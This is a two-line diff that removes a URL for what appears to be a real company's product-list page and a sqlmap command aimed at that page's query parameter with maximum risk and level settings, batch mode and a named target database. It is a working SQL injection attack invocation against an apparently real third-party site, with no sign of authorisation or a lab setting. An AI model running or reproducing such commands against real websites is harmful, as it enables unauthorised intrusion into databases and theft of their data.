@@ -1,2 +1,0 @@
-http://www.scantechproducts.com/en/product-list/product-list.php?cat1=5
-python ../sqlmap/sqlmap.py -u http://www.scantechproducts.com/en/product-list/product-list.php?cat1=5 --risk 3 --level 5 --batch -D SCANTECH6
